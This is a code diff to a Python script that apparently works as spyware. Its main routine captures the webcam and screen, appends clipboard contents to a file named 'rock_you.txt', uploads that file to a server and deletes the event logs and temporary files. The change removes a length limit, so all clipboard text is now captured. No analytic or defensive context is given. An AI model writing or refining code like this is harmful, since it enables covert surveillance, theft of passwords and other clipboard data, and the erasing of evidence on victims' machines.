@@ -178,8 +178,7 @@ def __main__():
         webcam()
         capture_ecran()
         with open("rock_you.txt", "a") as file:
-            if len(get_clipboard_content)<20:
-                file.write(get_clipboard_content() + "\n")
+            file.write(get_clipboard_content() + "\n")
     uploadServer('rock_you.txt')
     delete_event_logs()
     delete_temp_files()
